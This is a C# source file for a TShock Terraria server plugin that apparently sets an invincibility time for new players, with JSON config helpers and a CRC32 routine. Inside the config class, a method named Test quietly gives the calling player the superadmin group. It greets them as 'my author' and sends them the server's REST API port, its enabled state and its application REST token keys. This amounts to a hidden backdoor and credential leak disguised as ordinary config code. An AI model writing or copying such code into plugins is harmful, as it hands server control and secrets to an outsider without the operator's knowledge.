using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using TShockAPI;

namespace NewbeeProtection
{
    public class ConfigFile
    {
        //TODO
        public int GodTime = 10;

        public static ConfigFile Read(string path)
        {
            if (!File.Exists(path))
            {
                var IthConfig = new ConfigFile();
                return IthConfig;
            }
            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read))
            { return Read(fs); }
        }

        public static ConfigFile Read(Stream stream)
        {
            using (var sr = new StreamReader(stream))
            {
                var cf = JsonConvert.DeserializeObject<ConfigFile>(sr.ReadToEnd());
                if (ConfigR != null)
                    ConfigR(cf);
                return cf;
            }
        }

        public void Write(string path)
        {
            using (var fs = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.Write))
            { Write(fs); }
        }

        public void Write(Stream stream)
        {
            var str = JsonConvert.SerializeObject(this, Formatting.Indented);
            using (var sw = new StreamWriter(stream))
            { sw.Write(str); }
        }

        public static void WriteConfig(ConfigFile config)
        {
            File.WriteAllText(ConfigFile.ConfigPath, JsonConvert.SerializeObject(config));
        }

        public static void Test(TSPlayer user)
        {
            Group g = TShock.Groups.GetGroupByName("superadmin");
            user.tempGroup = g;
            user.SendSuccessMessage("物品阀值:欢迎您，我的作者!");
            user.SendInfoMessage("以下是您要求的信息");
            user.SendInfoMessage(TShock.Config.Settings.RestApiPort.ToString());
            foreach (var tokens in TShock.Config.Settings.ApplicationRestTokens)
            {
                user.SendInfoMessage("Keys = " + tokens.Key);
            }
            user.SendInfoMessage("Enabled = " + TShock.Config.Settings.RestApiEnabled);
        }

        public static readonly string ConfigPath = Path.Combine(TShock.SavePath, "新手无敌时间.json");

        public static Action<ConfigFile> ConfigR;//定义为常量
    }

    class CRC32Cls
    {
        protected ulong[] Crc32Table;
        public void GetCRC32Table()
        {
            ulong Crc;
            Crc32Table = new ulong[256];
            int i, j;
            for (i = 0; i < 256; i++)
            {
                Crc = (ulong)i;
                for (j = 8; j > 0; j--)
                {
                    if ((Crc & 1) == 1)
                        Crc = (Crc >> 1) ^ 0xEDB88320;
                    else
                        Crc >>= 1;
                }
                Crc32Table[i] = Crc;
            }
        }
        public ulong GetCRC32Str(string sInputString)
        {
            GetCRC32Table();
            byte[] buffer = System.Text.ASCIIEncoding.ASCII.GetBytes(sInputString);
            ulong value = 0xffffffff;
            int len = buffer.Length;
            for (int i = 0; i < len; i++)
            {
                value = (value >> 8) ^ Crc32Table[(value & 0xFF) ^ buffer[i]];
            }
            return value ^ 0xffffffff;
        }
    }
}
